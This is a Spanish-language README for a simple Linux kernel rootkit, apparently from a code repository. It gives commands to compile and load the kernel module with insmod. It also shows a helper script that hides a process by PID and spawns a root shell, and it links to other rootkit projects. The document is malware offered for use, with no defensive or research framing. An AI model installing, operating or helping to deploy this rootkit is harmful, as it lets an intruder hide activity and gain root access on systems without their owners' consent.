#Rootkit simple para linux

  Este rootkit puede ocultar procesos y elevar privilegios como root

#Compilado:

      $ sudo apt-get install linux-headers-$(uname -r)
      $ cd rootkit
      # make

#Instalación:
      # insmod rt.ko

#Uso:

#Para ocultar algun proceso
      # tools/rtcmd.py hpXXXX    // XXXX -> PID

#Para devolver una terminal como root
      # tools/rtcmd.py modulo4root /bin/bash

#Referencias:

     ~https://github.com/ivyl/rootkit
     ~http://www.cyberciti.biz/tips/compiling-linux-kernel-module.html
     ~https://github.com/mrrrgn/simple-rootkit
